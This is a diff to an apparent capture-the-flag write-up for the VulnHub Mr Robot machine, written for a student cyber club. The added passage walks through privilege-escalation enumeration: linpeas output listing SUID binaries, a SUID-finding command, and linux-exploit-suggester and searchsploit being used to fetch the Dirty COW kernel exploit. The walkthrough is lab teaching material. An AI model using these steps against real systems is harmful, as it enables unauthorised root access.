@@ -3251,13 +3251,11 @@ chmod +x linpeas.sh
 ```
 
 <p></p>
-And if we rerun the command now we can see that it works!
+And if we re-run the command now we can see that it works!
 <p></p>
 <div align="center">
 <img src="https://github.com/Shadow-Admins/Cyber_Club/blob/9669dc6005c0762eeeb6d9aa8e54305d49d6d142/Starting_Point/VulnHub/MrRobot/images/peas.png"><br>
 </div>
-<p></p>
-<a href="https://github.com/Shadow-Admins/Cyber_Club/blob/cbc44a1032d4808ebeef79bf95eff03b86dcacb3/Starting_Point/VulnHub/MrRobot/files/lin.txt" rel="nofollow">This</a> is my output.
 <p></p>
 The important thing obout linpeas is the legend at the top of the script.
 <p></p>
@@ -3273,6 +3271,254 @@ The important thing obout linpeas is the legend at the top of the script.
 ```
 
 <p></p>
+So you need to look through the output and look specifically for the RED/YELLOW text and take note of the RED text. I will only show parts of the output because of how large it is:
+<p></p>
+
+```
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+User & Groups: uid=1002(robot) gid=1002(robot) groups=1002(robot)
+Hostname: linux
+Writable folder: /opt/bitnami/mysql/tmp
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+[+] nmap is available for network discover & port scanning, you should use it yourself
+```
+
+<p></p>
+
+```
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root  46K Feb 17  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root  67K Feb 17  2014 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root  41K Feb 17  2014 /usr/bin/chsh
+-rwsr-xr-x 1 root root  46K Feb 17  2014 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root  32K Feb 17  2014 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root  37K Feb 17  2014 /bin/su
+-rwsr-xr-x 1 root root  10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root  44K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root  44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 431K May 12  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root  68K Feb 12  2015 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root  93K Feb 12  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root  11K Feb 25  2015 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
+-rwsr-xr-x 1 root root 152K Mar 12  2015 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
+-r-sr-xr-x 1 root root 9.4K Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root  14K Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+```
+
+<p></p>
+The two major things we found is the linux version and the nmap binary, which can both be used to priv esc. remeber back when I said we could have run a one line command to find one of these methods. This is the command:
+<p></p>
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+<p></p>
+Which outputs:
+<p></p>
+
+```
+robot@linux:/tmp$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+<p></p>
+So we could have found that nmap binary straight away. Now using the nmap binary is the easiest and most straight forward way to escalate so I will go over the more difficult way which is exploiting the linux version.
+<p></p>
+To start with if we google for this exploit and do a bit of research you may end up at this <a href="https://dirtycow.ninja/" rel="nofollow">page</a> which tells us about the exploit. We can also use a tool called linux-exploit-suggester-2.pl which you can get from <a href="https://github.com/jondonas/linux-exploit-suggester-2" rel="nofollow">here</a> to get this you ren the following command:
+<p></p>
+
+```
+git clone https://github.com/jondonas/linux-exploit-suggester-2.git
+```
+
+<p></p>
+which outputs:
+<p></p>
+
+```
+❯ git clone https://github.com/jondonas/linux-exploit-suggester-2.git
+Cloning into 'linux-exploit-suggester-2'...
+remote: Enumerating objects: 64, done.
+remote: Counting objects: 100% (6/6), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 64 (delta 1), reused 0 (delta 0), pack-reused 58
+Receiving objects: 100% (64/64), 30.83 KiB | 2.37 MiB/s, done.
+Resolving deltas: 100% (28/28), done.
+```
+
+<p></p>
+To run this and view the help file you change into the new directory and run: 
+<p></p>
+
+```
+./linux-exploit-suggester-2.pl -h
+```
+
+<p></p>
+Which outputs:
+<p></p>
+
+```
+❯ ./linux-exploit-suggester-2.pl  -h
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Usage: ./linux-exploit-suggester-2.pl [-h] [-k kernel] [-d]
+
+  [-h] Help (this message)
+  [-k] Kernel number (eg. 2.6.28)
+  [-d] Open exploit download menu
+
+  You can also provide a partial kernel version (eg. 2.4)
+  to see all exploits available.
+```
+
+<p></p>
+Lets try this on our vulnerable kernel using this command:
+<p></p>
+
+```
+./linux-exploit-suggester-2.pl  -k 3.1
+```
+
+<p></p>
+Which outputs:
+<p></p>
+
+```
+❯ ./linux-exploit-suggester-2.pl  -k 3.1
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 3.1
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] clone_newuser (3.1.8)
+      CVE-N\A
+      Source: http://www.exploit-db.com/exploits/38390
+  [2] dirty_cow (3.1.0)
+      CVE-2016-5195
+      Source: http://www.exploit-db.com/exploits/40616
+  [3] exploit_x (3.1.0)
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [4] memodipper (3.1.0)
+      CVE-2012-0056
+      Source: http://www.exploit-db.com/exploits/18411
+  [5] msr (3.1.0)
+      CVE-2013-0268
+      Source: http://www.exploit-db.com/exploits/27297
+  [6] overlayfs (3.13.0)
+      CVE-2015-8660
+      Source: http://www.exploit-db.com/exploits/39230
+  [7] perf_swevent (3.1.0)
+      CVE-2013-2094
+      Source: http://www.exploit-db.com/exploits/26131
+  [8] pp_key (3.10.0)
+      CVE-2016-0728
+      Source: http://www.exploit-db.com/exploits/39277
+  [9] rawmodePTY (3.14.0)
+      CVE-2014-0196
+      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
+  [10] semtex (3.1.0)
+      CVE-2013-2094
+      Source: http://www.exploit-db.com/exploits/25444
+  [11] timeoutpwn (3.10.0)
+      CVE-2014-0038
+      Source: http://www.exploit-db.com/exploits/31346
+```
+
+<p></p>
+We can see that dirty_cow was listed as a possible exploit, we can download that by adding the <kbd>-d</kbd> flag to our orriginal command which adds an input box at the bottom of the output by entering '2' it will automatically download the exploit for us. (side note if you want to try the original version of this script you can get it from <a href="https://github.com/mzet-/linux-exploit-suggester" rel="nofollow">here</a> where you will serve it and transfer it to the target VM like we did with linpeas, you then run it and it will give you a likely hood of vulnerability to certain kernel exploits and the option to download them straight to the target system)
+<p></p>
+
+```
+  Exploit Download
+  (Download all: 'a' / Individually: '2,4,5' / Exit: ^c)
+  Select exploits to download: 2
+
+  Downloading https://www.exploit-db.com/raw/40616 -> exploit_dirty_cow
+```
+
+<p></p>
+That is one way to obtain the exploit but did you know it is likely already on your system (if you're using Parrot or kali) to get this we use a tool called searchsploit (antoher tool you need to get used to using). The command looks like this:
+<p></p>
+
+```
+searchsploit dirty cow
+```
+
+<p></p>
+Which outputs:
+<p></p>
+
+```
+❯ searchsploit dirty cow
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                                                                      | linux/dos/43199.c
+Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                                                                      | linux/dos/44305.c
+Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                                          | linux/local/40616.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                                             | linux/local/40847.cpp
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                                                | linux/local/40838.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                                          | linux/local/40839.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                                                                 | linux/local/40611.c
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+
+<p></p>
+We can then obtain the exploit by changing the command to import the one that we want.
+<p></p>
+
+```
+❯ searchsploit -m 40616
+  Exploit: Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)
+      URL: https://www.exploit-db.com/exploits/40616
+     Path: /usr/share/exploitdb/exploits/linux/local/40616.c
+File Type: C source, ASCII text, with CRLF line terminators
+
+Copied to: /home/parrot/ctf/VulnHub/MrRobot/40616.c
+```
+
+<p></p>
+And there you have the exploit, now that we have looked at how to find and obtain the exploit lets use it to escalate our priveledges!
+<p></p>
+
+
+
+
+
+<a href="https://book.hacktricks.xyz/" rel="nofollow">HackTricks</a>
 
 
 
